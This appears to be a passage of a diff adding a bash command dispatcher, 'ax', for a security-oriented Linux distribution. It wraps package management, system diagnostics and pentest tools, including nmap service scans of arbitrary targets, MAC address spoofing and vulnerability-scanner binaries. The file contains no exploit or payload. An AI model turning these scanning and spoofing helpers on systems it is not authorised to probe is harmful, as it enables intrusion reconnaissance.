@@ -1,0 +1,3053 @@
+#!/usr/bin/env bash
+# =====================================================================
+# 🌌 ASTERIX OS - Master Omni-Command System & Arsenal Engine: `ax` / `asterix`
+# Next-Generation Cybernetic System & Arsenal Management Core
+# Supports 60+ Native High-Velocity Subcommands & Dynamic OS Dispatch
+# =====================================================================
+
+set -e
+
+# ANSI 256-Color Cyber Palette
+C_RESET='\033[0m'
+C_BOLD='\033[1m'
+C_DIM='\033[2m'
+C_RED='\033[38;5;196m'
+C_ORANGE='\033[38;5;208m'
+C_YELLOW='\033[38;5;220m'
+C_GREEN='\033[38;5;46m'
+C_CYAN='\033[38;5;51m'
+C_BLUE='\033[38;5;45m'
+C_MAGENTA='\033[38;5;201m'
+C_PURPLE='\033[38;5;141m'
+C_WHITE='\033[38;5;231m'
+C_GRAY='\033[38;5;240m'
+
+VERSION="v2.0.0-cyber-omni"
+
+print_banner() {
+    echo -e "${C_CYAN}${C_BOLD}"
+    cat << 'EOF'
+    █████╗ ███████╗████████╗███████╗██████╗ ██╗██╗  ██╗     ██████╗ ███████╗
+   ██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║╚██╗██╔╝    ██╔═══██╗██╔════╝
+   ███████║███████╗   ██║   █████╗  ██████╔╝██║ ╚███╔╝     ██║   ██║███████╗
+   ██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗██║ ██╔██╗     ██║   ██║╚════██║
+   ██║  ██║███████║   ██║   ███████╗██║  ██║██║██╔╝ ██╗    ╚██████╔╝███████║
+   ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝     ╚═════╝ ╚══════╝
+EOF
+    echo -e "${C_MAGENTA}${C_BOLD}           >> OMNI-COMMAND OS & ARSENAL CONTROL ENGINE [ax] <<${C_RESET}\n"
+}
+
+# Determine execution environment
+detect_pkg_manager() {
+    if [ -n "$PREFIX" ] && command -v pkg >/dev/null 2>&1; then
+        echo "termux"
+    elif command -v apt-get >/dev/null 2>&1; then
+        echo "apt"
+    elif command -v pacman >/dev/null 2>&1; then
+        echo "pacman"
+    elif command -v dnf >/dev/null 2>&1; then
+        echo "dnf"
+    elif command -v apk >/dev/null 2>&1; then
+        echo "apk"
+    else
+        echo "unknown"
+    fi
+}
+
+run_as_root() {
+    if [ "$(id -u)" -ne 0 ]; then
+        if command -v sudo >/dev/null 2>&1; then
+            sudo "$@"
+        elif command -v tsu >/dev/null 2>&1; then
+            tsu -c "$*"
+        else
+            "$@"
+        fi
+    else
+        "$@"
+    fi
+}
+
+# Locate ASTERIX base directory
+find_asterix_root() {
+    if [ -d "/etc/asterix" ]; then
+        echo "/etc/asterix"
+    elif [ -d "$HOME/asterix" ]; then
+        echo "$HOME/asterix"
+    elif [ -d "$(pwd)/ui-core" ]; then
+        echo "$(pwd)"
+    else
+        echo ""
+    fi
+}
+
+find_helper_script() {
+    local script_name="$1"
+    local ax_root
+    ax_root=$(find_asterix_root)
+    if [ -n "$ax_root" ] && [ -f "${ax_root}/scripts-hub/${script_name}" ]; then
+        echo "${ax_root}/scripts-hub/${script_name}"
+    elif [ -f "/etc/asterix/scripts-hub/${script_name}" ]; then
+        echo "/etc/asterix/scripts-hub/${script_name}"
+    elif [ -f "scripts-hub/${script_name}" ]; then
+        echo "scripts-hub/${script_name}"
+    else
+        echo ""
+    fi
+}
+
+run_native_bin() {
+    local bin_name="$1"
+    shift || true
+    if command -v "$bin_name" >/dev/null 2>&1; then
+        "$bin_name" "$@"
+    elif [ -x "/usr/local/bin/${bin_name}" ]; then
+        "/usr/local/bin/${bin_name}" "$@"
+    elif [ -x "core-utils-c/bin/${bin_name}" ]; then
+        "core-utils-c/bin/${bin_name}" "$@"
+    elif [ -x "core-utils-cpp/bin/${bin_name}" ]; then
+        "core-utils-cpp/bin/${bin_name}" "$@"
+    elif [ -x "dist/${bin_name}" ]; then
+        "dist/${bin_name}" "$@"
+    else
+        return 1
+    fi
+}
+
+# ---------------------------------------------------------------------
+# 1. Core System & Package Operations
+# ---------------------------------------------------------------------
+
+cmd_update() {
+    print_banner
+    echo -e "${C_BLUE}╔══════════════════════════════════════════════════════════════════════════╗${C_RESET}"
+    echo -e "${C_BLUE}║${C_WHITE} ${C_BOLD}[ SYSTEM & REPOSITORY UPDATE SEQUENCE ]${C_RESET}${C_BLUE}                                 ║${C_RESET}"
+    echo -e "${C_BLUE}╚══════════════════════════════════════════════════════════════════════════╝${C_RESET}\n"
+
+    PKG_MGR=$(detect_pkg_manager)
+    echo -e "${C_CYAN}[*] Environment detected:${C_RESET} ${C_YELLOW}${PKG_MGR}${C_RESET}"
+
+    # Step 1: Update package indexes
+    echo -e "\n${C_YELLOW}[1/4] Refreshing Package Repository Indexes...${C_RESET}"
+    case "$PKG_MGR" in
+        termux)
+            pkg update -y || echo -e "${C_RED}[!] pkg update had warnings${C_RESET}"
+            ;;
+        apt)
+            run_as_root apt-get update -y || echo -e "${C_RED}[!] apt-get update encountered issues${C_RESET}"
+            ;;
+        pacman)
+            run_as_root pacman -Sy --noconfirm || true
+            ;;
+        *)
+            echo -e "${C_GRAY}[i] No standard package manager detected. Skipping index refresh.${C_RESET}"
+            ;;
+    esac
+    echo -e "${C_GREEN}[✔] Package repository indexes up to date.${C_RESET}"
+
+    # Step 2: Check Git upstream repo updates if inside repository
+    echo -e "\n${C_YELLOW}[2/4] Checking ASTERIX OS Core Updates...${C_RESET}"
+    AX_ROOT=$(find_asterix_root)
+    if [ -n "$AX_ROOT" ] && [ -d "$AX_ROOT/.git" ]; then
+        echo -e "${C_CYAN}[*] Repository found at ${AX_ROOT}${C_RESET}"
+        (cd "$AX_ROOT" && git fetch --all --prune 2>/dev/null && git status -uno) || echo -e "${C_GRAY}[i] Offline or local git repo.${C_RESET}"
+    else
+        echo -e "${C_GREEN}[✔] ASTERIX OS system files verified.${C_RESET}"
+    fi
+
+    # Step 3: Check Security Definitions & Exploit DB
+    echo -e "\n${C_YELLOW}[3/4] Updating Security Definitions & Database Signatures...${C_RESET}"
+    if command -v searchsploit >/dev/null 2>&1; then
+        echo -e "${C_CYAN}[*] Updating Exploit-DB signatures (searchsploit -u)...${C_RESET}"
+        searchsploit -u 2>/dev/null || echo -e "${C_GRAY}[i] searchsploit update skipped or offline.${C_RESET}"
+    fi
+    if command -v msfupdate >/dev/null 2>&1; then
+        echo -e "${C_CYAN}[*] Updating Metasploit Framework...${C_RESET}"
+        run_as_root msfupdate 2>/dev/null || true
+    fi
+    if command -v nmap >/dev/null 2>&1; then
+        echo -e "${C_CYAN}[*] Updating Nmap NSE script database...${C_RESET}"
+        run_as_root nmap --script-updatedb 2>/dev/null || true
+    fi
+    echo -e "${C_GREEN}[✔] Security databases synchronized.${C_RESET}"
+
+    # Step 4: Verify Toolchains
+    echo -e "\n${C_YELLOW}[4/4] Verifying Compiler & Runtime Health...${C_RESET}"
+    for tool in rustc cargo gcc g++ go python3; do
+        if command -v "$tool" >/dev/null 2>&1; then
+            echo -e "  ${C_GREEN}●${C_RESET} ${C_WHITE}${tool}${C_RESET} : ${C_GREEN}AVAILABLE${C_RESET} ($("$tool" --version 2>/dev/null | head -n1))"
+        else
+            echo -e "  ${C_GRAY}○${C_RESET} ${C_WHITE}${tool}${C_RESET} : ${C_DIM}NOT INSTALLED (optional)${C_RESET}"
+        fi
+    done
+
+    echo -e "\n${C_GREEN}${C_BOLD}[✔] ax update complete! System ready for operation or 'ax upgrade'.${C_RESET}\n"
+}
+
+cmd_upgrade() {
+    print_banner
+    echo -e "${C_BLUE}╔══════════════════════════════════════════════════════════════════════════╗${C_RESET}"
+    echo -e "${C_BLUE}║${C_WHITE} ${C_BOLD}[ SYSTEM & ARSENAL COMPREHENSIVE UPGRADE ]${C_RESET}${C_BLUE}                             ║${C_RESET}"
+    echo -e "${C_BLUE}╚══════════════════════════════════════════════════════════════════════════╝${C_RESET}\n"
+
+    PKG_MGR=$(detect_pkg_manager)
+    echo -e "${C_CYAN}[*] Target Environment:${C_RESET} ${C_YELLOW}${PKG_MGR}${C_RESET}"
+
+    # Step 1: Upgrade OS Packages
+    echo -e "\n${C_YELLOW}[1/4] Upgrading System Packages...${C_RESET}"
+    case "$PKG_MGR" in
+        termux)
+            pkg upgrade -y || echo -e "${C_RED}[!] pkg upgrade finished with notices${C_RESET}"
+            ;;
+        apt)
+            run_as_root apt-get upgrade -y || echo -e "${C_RED}[!] apt-get upgrade finished with notices${C_RESET}"
+            ;;
+        pacman)
+            run_as_root pacman -Syu --noconfirm || true
+            ;;
+        *)
+            echo -e "${C_GRAY}[i] No supported package manager found for full OS package upgrade.${C_RESET}"
+            ;;
+    esac
+    echo -e "${C_GREEN}[✔] OS system packages upgraded.${C_RESET}"
+
+    # Step 2: Rebuild Native ASTERIX Suites (C, C++, Go, Assembly)
+    echo -e "\n${C_YELLOW}[2/4] Rebuilding Native ASTERIX Multi-Language Utilities...${C_RESET}"
+    AX_ROOT=$(find_asterix_root)
+    if [ -n "$AX_ROOT" ] && [ -f "$AX_ROOT/build-all.sh" ]; then
+        echo -e "${C_CYAN}[*] Executing Master Build Engine at ${AX_ROOT}/build-all.sh...${C_RESET}"
+        bash "$AX_ROOT/build-all.sh" || echo -e "${C_YELLOW}[!] Warning during build-all.sh execution${C_RESET}"
+    else
+        echo -e "${C_GRAY}[i] build-all.sh not found in root path; checking individual suites...${C_RESET}"
+        if [ -d "/etc/asterix/core-utils-c" ]; then
+            (cd /etc/asterix/core-utils-c && make all && run_as_root make install 2>/dev/null) || true
+        fi
+        if [ -d "/etc/asterix/core-utils-cpp" ]; then
+            (cd /etc/asterix/core-utils-cpp && make all && run_as_root make install 2>/dev/null) || true
+        fi
+    fi
+    echo -e "${C_GREEN}[✔] Native tool suites updated.${C_RESET}"
+
+    # Step 3: Recompile / Update Rust Command & Control Hub
+    echo -e "\n${C_YELLOW}[3/4] Rebuilding ASTERIX Native Rust Command Matrix...${C_RESET}"
+    LOADER_SRC=""
+    if [ -d "$AX_ROOT/ui-core/asterix-loader" ]; then
+        LOADER_SRC="$AX_ROOT/ui-core/asterix-loader"
+    elif [ -d "/etc/asterix/ui-core/asterix-loader" ]; then
+        LOADER_SRC="/etc/asterix/ui-core/asterix-loader"
+    fi
+
+    if [ -n "$LOADER_SRC" ]; then
+        if command -v cargo >/dev/null 2>&1; then
+            echo -e "${C_CYAN}[*] Building release binary with cargo...${C_RESET}"
+            (cd "$LOADER_SRC" && cargo build --release && run_as_root cp target/release/asterix-loader /usr/local/bin/asterix-loader 2>/dev/null || true)
+            echo -e "${C_GREEN}[✔] asterix-loader successfully compiled and installed.${C_RESET}"
+        elif command -v rustc >/dev/null 2>&1; then
+            echo -e "${C_CYAN}[*] Compiling directly with rustc...${C_RESET}"
+            (cd "$LOADER_SRC" && rustc -O -C lto=yes src/main.rs -o /tmp/asterix-loader && run_as_root cp /tmp/asterix-loader /usr/local/bin/asterix-loader 2>/dev/null || true)
+            echo -e "${C_GREEN}[✔] asterix-loader compiled.${C_RESET}"
+        else
+            echo -e "${C_GRAY}[i] Rust compiler not detected; using existing binary.${C_RESET}"
+        fi
+    fi
+
+    # Step 4: Clean Old Packages
+    echo -e "\n${C_YELLOW}[4/4] Performing Automated System Cleanup...${C_RESET}"
+    case "$PKG_MGR" in
+        apt)
+            run_as_root apt-get autoremove -y >/dev/null 2>&1 || true
+            run_as_root apt-get clean >/dev/null 2>&1 || true
+            ;;
+        termux)
+            pkg clean >/dev/null 2>&1 || true
+            ;;
+    esac
+    echo -e "${C_GREEN}[✔] System caches cleaned.${C_RESET}"
+
+    echo -e "\n${C_GREEN}${C_BOLD}[✔] ax upgrade complete! All systems and arsenals are up to date.${C_RESET}\n"
+}
+
+cmd_install() {
+    if [ -z "$1" ]; then
+        echo -e "${C_RED}[!] Error: No package specified to install.${C_RESET}"
+        echo -e "${C_YELLOW}Usage:${C_RESET} ax install <package_name...>"
+        exit 1
+    fi
+
+    PKG_MGR=$(detect_pkg_manager)
+    echo -e "${C_CYAN}[*] Installing package(s) via ${PKG_MGR}:${C_RESET} ${C_WHITE}${*}${C_RESET}"
+
+    case "$PKG_MGR" in
+        termux)
+            pkg install -y "$@"
+            ;;
+        apt)
+            run_as_root apt-get install -y "$@"
+            ;;
+        pacman)
+            run_as_root pacman -S --noconfirm "$@"
+            ;;
+        dnf)
+            run_as_root dnf install -y "$@"
+            ;;
+        *)
+            echo -e "${C_RED}[!] Unsupported package manager.${C_RESET}"
+            exit 1
+            ;;
+    esac
+}
+
+cmd_remove() {
+    if [ -z "$1" ]; then
+        echo -e "${C_RED}[!] Error: No package specified to remove.${C_RESET}"
+        echo -e "${C_YELLOW}Usage:${C_RESET} ax remove <package_name...>"
+        exit 1
+    fi
+
+    PKG_MGR=$(detect_pkg_manager)
+    echo -e "${C_YELLOW}[*] Removing package(s) via ${PKG_MGR}:${C_RESET} ${C_WHITE}${*}${C_RESET}"
+
+    case "$PKG_MGR" in
+        termux)
+            pkg uninstall -y "$@"
+            ;;
+        apt)
+            run_as_root apt-get remove --purge -y "$@"
+            ;;
+        pacman)
+            run_as_root pacman -R --noconfirm "$@"
+            ;;
+        dnf)
+            run_as_root dnf remove -y "$@"
+            ;;
+        *)
+            echo -e "${C_RED}[!] Unsupported package manager.${C_RESET}"
+            exit 1
+            ;;
+    esac
+}
+
+cmd_search() {
+    if [ -z "$1" ]; then
+        echo -e "${C_RED}[!] Error: No search term specified.${C_RESET}"
+        echo -e "${C_YELLOW}Usage:${C_RESET} ax search <keyword>"
+        exit 1
+    fi
+
+    PKG_MGR=$(detect_pkg_manager)
+    case "$PKG_MGR" in
+        termux)
+            pkg search "$@"
+            ;;
+        apt)
+            apt-cache search "$@"
+            ;;
+        pacman)
+            pacman -Ss "$@"
+            ;;
+        dnf)
+            dnf search "$@"
+            ;;
+        *)
+            echo -e "${C_RED}[!] Unsupported package manager.${C_RESET}"
+            exit 1
+            ;;
+    esac
+}
+
+cmd_clean() {
+    PKG_MGR=$(detect_pkg_manager)
+    echo -e "${C_CYAN}[*] Cleaning system package caches and temporary files...${C_RESET}"
+    case "$PKG_MGR" in
+        apt)
+            run_as_root apt-get autoremove -y
+            run_as_root apt-get clean
+            ;;
+        termux)
+            pkg clean
+            ;;
+        pacman)
+            run_as_root pacman -Sc --noconfirm
+            ;;
+        *)
+            echo -e "${C_GRAY}[i] No standard package cleaner available.${C_RESET}"
+            ;;
+    esac
+    CLEAN_SCRIPT=$(find_helper_script "secure-cleanup.sh")
+    if [ -n "$CLEAN_SCRIPT" ]; then
+        bash "$CLEAN_SCRIPT" 2>/dev/null || true
+    fi
+    echo -e "${C_GREEN}[✔] Clean completed.${C_RESET}"
+}
+
+cmd_build() {
+    AX_ROOT=$(find_asterix_root)
+    if [ -n "$AX_ROOT" ] && [ -f "$AX_ROOT/build-all.sh" ]; then
+        echo -e "${C_CYAN}[*] Running ASTERIX OS Master Build Engine...${C_RESET}"
+        bash "$AX_ROOT/build-all.sh" "$@"
+    else
+        echo -e "${C_RED}[!] build-all.sh not found in system or current directory.${C_RESET}"
+        exit 1
+    fi
+}
+
+cmd_doctor() {
+    print_banner
+    echo -e "${C_BLUE}╔══════════════════════════════════════════════════════════════════════════╗${C_RESET}"
+    echo -e "${C_BLUE}║${C_WHITE} ${C_BOLD}[ ASTERIX SYSTEM HEALTH & TOOLCHAIN DIAGNOSTICS ]${C_RESET}${C_BLUE}                      ║${C_RESET}"
+    echo -e "${C_BLUE}╚══════════════════════════════════════════════════════════════════════════╝${C_RESET}\n"
+
+    check_tool() {
+        local name="$1"
+        local category="$2"
+        if command -v "$name" >/dev/null 2>&1; then
+            printf "  ${C_GREEN}✔${C_RESET} %-24s %-22s ${C_GREEN}[OK]${C_RESET}\n" "$name" "$category"
+        else
+            printf "  ${C_RED}✖${C_RESET} %-24s %-22s ${C_YELLOW}[MISSING]${C_RESET}\n" "$name" "$category"
+        fi
+    }
+
+    echo -e "${C_CYAN}${C_BOLD}Compilers & Core Runtimes:${C_RESET}"
+    check_tool "rustc" "Rust Compiler"
+    check_tool "cargo" "Rust Package Manager"
+    check_tool "gcc" "C Compiler"
+    check_tool "g++" "C++ Compiler"
+    check_tool "make" "Make Build Engine"
+    check_tool "nasm" "Assembly Compiler"
+    check_tool "go" "Golang Runtime"
+    check_tool "python3" "Python 3 Runtime"
+    check_tool "node" "Node.js Engine"
+
+    echo -e "\n${C_MAGENTA}${C_BOLD}Cybersecurity & Penetration Suite:${C_RESET}"
+    check_tool "nmap" "Network Scanner"
+    check_tool "masscan" "Port Scanner"
+    check_tool "msfconsole" "Metasploit Core"
+    check_tool "sqlmap" "SQL Injector"
+    check_tool "wireshark" "Packet Analyzer"
+    check_tool "tshark" "CLI Packet Sniffer"
+    check_tool "tcpdump" "Packet Sniffer"
+    check_tool "aircrack-ng" "Wireless Security"
+    check_tool "radare2" "Reverse Engineering"
+    check_tool "gdb" "Debugger"
+    check_tool "hashcat" "Password Cracker"
+    check_tool "john" "Password Cracker"
+
+    echo -e "\n${C_YELLOW}${C_BOLD}Workspace & Terminal Multiplexer:${C_RESET}"
+    check_tool "tmux" "Terminal Multiplexer"
+    check_tool "htop" "Process Monitor"
+    check_tool "btop" "Cyber Monitor"
+    check_tool "fzf" "Fuzzy Finder"
+    check_tool "zoxide" "Smart Jumper"
+    check_tool "lazygit" "Git Terminal GUI"
+
+    echo -e "\n${C_BLUE}${C_BOLD}ASTERIX Native Utilities:${C_RESET}"
+    for ax_bin in asterix-sysinfo asterix-memview asterix-netprobe asterix-hasher asterix-shredder asterix-rootkit-detect asterix-syscall-mon asterix-env-dump asterix-vulnscan asterix-packetcraft asterix-logwatch asterix-webrecon asterix-loader; do
+        check_tool "$ax_bin" "Native Subsystem"
+    done
+
+    # Persistent storage check
+    echo -e "\n${C_WHITE}${C_BOLD}Storage Subsystem:${C_RESET}"
+    if [ -d "/asterix_persistent" ]; then
+        echo -e "  ${C_GREEN}✔${C_RESET} Persistent Volume (/asterix_persistent) : ${C_GREEN}CONNECTED${C_RESET}"
+    elif [ -d "$HOME/asterix_persistent" ]; then
+        echo -e "  ${C_GREEN}✔${C_RESET} Persistent Volume ($HOME/asterix_persistent) : ${C_GREEN}CONNECTED (Termux)${C_RESET}"
+    else
+        echo -e "  ${C_YELLOW}⚠${C_RESET} Persistent Volume : ${C_YELLOW}SIMULATED (Ephemeral)${C_RESET}"
+    fi
+
+    echo -e "\n${C_CYAN}[i] Tip: Run 'ax update && ax upgrade' to repair missing modules.${C_RESET}\n"
+}
+
+cmd_status() {
+    print_banner
+    HOST=$(hostname 2>/dev/null || echo "asterix-node")
+    KERNEL=$(uname -r 2>/dev/null || echo "unknown-kernel")
+    ARCH=$(uname -m 2>/dev/null || echo "unknown-arch")
+    UPTIME=$(uptime 2>/dev/null | awk -F'( |,|:)+' '{print $6,"hrs",$7,"min"}' || echo "active")
+    IP=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' || hostname -I 2>/dev/null | awk '{print $1}' || echo "127.0.0.1")
+    
+    echo -e "${C_BLUE}╔══════════════════════════════════════════════════════════════════════════╗${C_RESET}"
+    echo -e "${C_BLUE}║${C_WHITE} ${C_BOLD}[ ASTERIX REAL-TIME SYSTEM TELEMETRY ]${C_RESET}${C_BLUE}                                 ║${C_RESET}"
+    echo -e "${C_BLUE}╠══════════════════════════════════════════════════════════════════════════╣${C_RESET}"
+    printf "${C_BLUE}║${C_WHITE}  NODE:         ${C_YELLOW}%-20s${C_WHITE}IP:     ${C_GREEN}%-24s${C_BLUE}║\n" "$HOST" "$IP"
+    printf "${C_BLUE}║${C_WHITE}  KERNEL:       ${C_CYAN}%-20s${C_WHITE}ARCH:   ${C_CYAN}%-24s${C_BLUE}║\n" "$KERNEL" "$ARCH"
+    printf "${C_BLUE}║${C_WHITE}  UPTIME:       ${C_MAGENTA}%-20s${C_WHITE}CORE:   ${C_MAGENTA}%-24s${C_BLUE}║\n" "$UPTIME" "ASTERIX $VERSION"
+    
+    PERSIST="INACTIVE"
+    if [ -d "/asterix_persistent" ] || [ -d "$HOME/asterix_persistent" ]; then
+        PERSIST="ACTIVE [Connected]"
+    fi
+    printf "${C_BLUE}║${C_WHITE}  PERSISTENCE:  ${C_GREEN}%-54s${C_BLUE}║\n" "$PERSIST"
+    echo -e "${C_BLUE}╚══════════════════════════════════════════════════════════════════════════╝${C_RESET}\n"
+}
+
+cmd_version() {
+    echo -e "${C_CYAN}${C_BOLD}ASTERIX OS [ax / asterix]${C_RESET} ${C_GREEN}${VERSION}${C_RESET}"
+    echo -e "${C_GRAY}Next-Gen Cybernetic Security Operating System & Mobile Engine${C_RESET}"
+    echo -e "${C_GRAY}Architecture:${C_RESET} $(uname -m 2>/dev/null || echo "x86_64/aarch64")"
+    echo -e "${C_GRAY}Kernel:${C_RESET}       $(uname -r 2>/dev/null || echo "Linux")"
+}
+
+# ---------------------------------------------------------------------
+# 2. Network & Connectivity Suite
+# ---------------------------------------------------------------------
+
+cmd_ip() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX Network Telemetry:${C_RESET}"
+    local lan_ip
+    lan_ip=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' || hostname -I 2>/dev/null | awk '{print $1}' || echo "127.0.0.1")
+    local gateway
+    gateway=$(ip route show default 2>/dev/null | awk '{print $3}' || echo "Unknown")
+    echo -e "  ${C_GREEN}●${C_RESET} ${C_WHITE}Local LAN IP:${C_RESET}    ${C_YELLOW}${lan_ip}${C_RESET}"
+    echo -e "  ${C_GREEN}●${C_RESET} ${C_WHITE}Default Gateway:${C_RESET} ${C_CYAN}${gateway}${C_RESET}"
+    
+    echo -e "\n${C_CYAN}[*] Querying WAN Public IP...${C_RESET}"
+    local wan_ip
+    wan_ip=$(curl -s --max-time 4 ifconfig.me 2>/dev/null || curl -s --max-time 4 api.ipify.org 2>/dev/null || echo "Unavailable/Offline")
+    echo -e "  ${C_GREEN}●${C_RESET} ${C_WHITE}Public WAN IP:${C_RESET}   ${C_MAGENTA}${wan_ip}${C_RESET}\n"
+
+    echo -e "${C_CYAN}[*] Active Interfaces:${C_RESET}"
+    ip -br addr show 2>/dev/null || ifconfig -s 2>/dev/null || true
+    echo ""
+}
+
+cmd_ports() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX Listening Sockets & Ports Audit:${C_RESET}\n"
+    if command -v ss >/dev/null 2>&1; then
+        ss -tulpn
+    elif command -v netstat >/dev/null 2>&1; then
+        netstat -tulpn
+    elif command -v lsof >/dev/null 2>&1; then
+        lsof -i -P -n | grep LISTEN
+    else
+        echo -e "${C_RED}[!] No socket inspection tool (ss, netstat, lsof) found.${C_RESET}"
+    fi
+}
+
+cmd_ping() {
+    local target="${1:-1.1.1.1}"
+    echo -e "${C_CYAN}${C_BOLD}[*] Cybernetic ICMP Latency Probe » ${C_YELLOW}${target}${C_RESET}..."
+    ping -c 4 "$target"
+}
+
+cmd_scan() {
+    if [ -z "$1" ]; then
+        echo -e "${C_RED}[!] Error: Target IP/host required.${C_RESET}\n${C_YELLOW}Usage:${C_RESET} ax scan <target>"
+        exit 1
+    fi
+    if command -v nmap >/dev/null 2>&1; then
+        echo -e "${C_CYAN}${C_BOLD}[*] Launching Nmap Rapid Service Probe on ${1}...${C_RESET}"
+        nmap -sV -sC -T4 "$@"
+    else
+        if run_native_bin "asterix-netprobe" "$@"; then
+            return 0
+        fi
+        echo -e "${C_YELLOW}[!] nmap not found. Running basic ping check...${C_RESET}"
+        ping -c 3 "$1"
+    fi
+}
+
+cmd_netrecon() {
+    local script
+    script=$(find_helper_script "net-recon.sh")
+    if [ -n "$script" ]; then
+        bash "$script" "$@"
+    else
+        echo -e "${C_RED}[!] net-recon.sh not found.${C_RESET}"
+    fi
+}
+
+cmd_mac() {
+    local iface="$1"
+    if [ -z "$iface" ]; then
+        iface=$(ip route show default 2>/dev/null | awk '{print $5}' || echo "eth0")
+    fi
+    echo -e "${C_CYAN}${C_BOLD}[*] MAC Address Control on interface:${C_RESET} ${C_YELLOW}${iface}${C_RESET}"
+    if command -v macchanger >/dev/null 2>&1; then
+        echo -e "${C_YELLOW}[*] Generating randomized cyber MAC address...${C_RESET}"
+        run_as_root macchanger -r "$iface"
+    else
+        echo -e "${C_WHITE}Current Hardware Address:${C_RESET}"
+        ip link show "$iface" 2>/dev/null | grep -o "link/ether .*" || echo "Interface not found"
+        echo -e "${C_GRAY}[i] Install macchanger for automatic spoofing (ax install macchanger)${C_RESET}"
+    fi
+}
+
+cmd_webrecon() {
+    if run_native_bin "asterix-webrecon" "$@"; then
+        return 0
+    fi
+    echo -e "${C_YELLOW}[!] asterix-webrecon not built. Run 'ax build' to compile.${C_RESET}"
+}
+
+cmd_dns() {
+    local domain="${1:-google.com}"
+    echo -e "${C_CYAN}${C_BOLD}[*] DNS Resolution & MX Records for:${C_RESET} ${C_YELLOW}${domain}${C_RESET}"
+    if command -v dig >/dev/null 2>&1; then
+        dig +short A "$domain"
+        dig +short MX "$domain"
+        dig +short TXT "$domain"
+    elif command -v host >/dev/null 2>&1; then
+        host "$domain"
+    elif command -v nslookup >/dev/null 2>&1; then
+        nslookup "$domain"
+    else
+        getent hosts "$domain"
+    fi
+}
+
+cmd_whois() {
+    if [ -z "$1" ]; then
+        echo -e "${C_RED}[!] Error: Domain or IP target required.${C_RESET}\n${C_YELLOW}Usage:${C_RESET} ax whois <target>"
+        exit 1
+    fi
+    if command -v whois >/dev/null 2>&1; then
+        whois "$@"
+    else
+        echo -e "${C_YELLOW}[!] whois not installed. Install with: ax install whois${C_RESET}"
+    fi
+}
+
+cmd_traceroute() {
+    local target="${1:-1.1.1.1}"
+    echo -e "${C_CYAN}${C_BOLD}[*] Tracing network route to ${target}...${C_RESET}"
+    if command -v traceroute >/dev/null 2>&1; then
+        traceroute -m 20 "$target"
+    elif command -v tracepath >/dev/null 2>&1; then
+        tracepath "$target"
+    else
+        echo -e "${C_YELLOW}[!] traceroute/tracepath not installed.${C_RESET}"
+    fi
+}
+
+cmd_arp() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX Local ARP Cache Table:${C_RESET}\n"
+    ip neigh show 2>/dev/null || arp -a 2>/dev/null || cat /proc/net/arp
+}
+
+cmd_connections() {
+    echo -e "${C_CYAN}${C_BOLD}[*] Active Established External Connections:${C_RESET}\n"
+    ss -tupn state established 2>/dev/null || netstat -an | grep ESTABLISHED
+}
+
+# ---------------------------------------------------------------------
+# 3. Security, Cryptography & Defense
+# ---------------------------------------------------------------------
+
+cmd_hash() {
+    if [ -z "$1" ]; then
+        echo -e "${C_RED}[!] Error: File or text required to hash.${C_RESET}\n${C_YELLOW}Usage:${C_RESET} ax hash <file>"
+        exit 1
+    fi
+    if run_native_bin "asterix-hasher" "$@"; then
+        return 0
+    fi
+    local target="$1"
+    if [ -f "$target" ]; then
+        echo -e "${C_CYAN}${C_BOLD}[*] Calculating Checksums for:${C_RESET} ${C_WHITE}${target}${C_RESET}"
+        echo -e "  ${C_CYAN}MD5:    ${C_RESET}$(md5sum "$target" 2>/dev/null | awk '{print $1}')"
+        echo -e "  ${C_GREEN}SHA1:   ${C_RESET}$(sha1sum "$target" 2>/dev/null | awk '{print $1}')"
+        echo -e "  ${C_YELLOW}SHA256: ${C_RESET}$(sha256sum "$target" 2>/dev/null | awk '{print $1}')"
+        echo -e "  ${C_MAGENTA}SHA512: ${C_RESET}$(sha512sum "$target" 2>/dev/null | awk '{print $1}')"
+    else
+        echo -e "${C_CYAN}${C_BOLD}[*] Calculating Checksum for String:${C_RESET}"
+        echo -n "$target" | sha256sum | awk '{print "  SHA256: " $1}'
+    fi
+}
+
+cmd_shred() {
+    if [ -z "$1" ]; then
+        echo -e "${C_RED}[!] Error: File target required to shred.${C_RESET}\n${C_YELLOW}Usage:${C_RESET} ax shred <file>"
+        exit 1
+    fi
+    if run_native_bin "asterix-shredder" "$@"; then
+        return 0
+    fi
+    echo -e "${C_RED}${C_BOLD}[*] Performing Multi-Pass Cryptographic Wipe on:${C_RESET} ${C_WHITE}${1}${C_RESET}"
+    if command -v shred >/dev/null 2>&1; then
+        shred -u -z -n 3 "$1"
+        echo -e "${C_GREEN}[✔] File permanently obliterated.${C_RESET}"
+    else
+        rm -f "$1"
+        echo -e "${C_YELLOW}[✔] File unlinked.${C_RESET}"
+    fi
+}
+
+cmd_rootkit() {
+    if run_native_bin "asterix-rootkit-detect"; then
+        return 0
+    fi
+    echo -e "${C_CYAN}${C_BOLD}[*] Performing Rootkit & Anomaly Scan...${C_RESET}"
+    if command -v chkrootkit >/dev/null 2>&1; then
+        run_as_root chkrootkit
+    else
+        echo -e "${C_GRAY}[*] Checking hidden processes in /proc...${C_RESET}"
+        ps -ef | grep -E "\[.*\]" | head -n 15
+        echo -e "${C_GREEN}[✔] Basic kernel checks completed.${C_RESET}"
+    fi
+}
+
+cmd_trace() {
+    if run_native_bin "asterix-syscall-mon" "$@"; then
+        return 0
+    fi
+    if [ -n "$1" ]; then
+        echo -e "${C_CYAN}[*] Tracing syscalls for PID/Target ${1}...${C_RESET}"
+        strace -c -p "$1" 2>/dev/null || strace "$@"
+    else
+        echo -e "${C_YELLOW}Usage:${C_RESET} ax trace <pid or command>"
+    fi
+}
+
+cmd_packet() {
+    if run_native_bin "asterix-packetcraft" "$@"; then
+        return 0
+    fi
+    echo -e "${C_YELLOW}[!] asterix-packetcraft utility not built. Run 'ax build' to compile.${C_RESET}"
+}
+
+cmd_vuln() {
+    if run_native_bin "asterix-vulnscan" "$@"; then
+        return 0
+    fi
+    echo -e "${C_YELLOW}[!] asterix-vulnscan utility not built. Run 'ax build' to compile.${C_RESET}"
+}
+
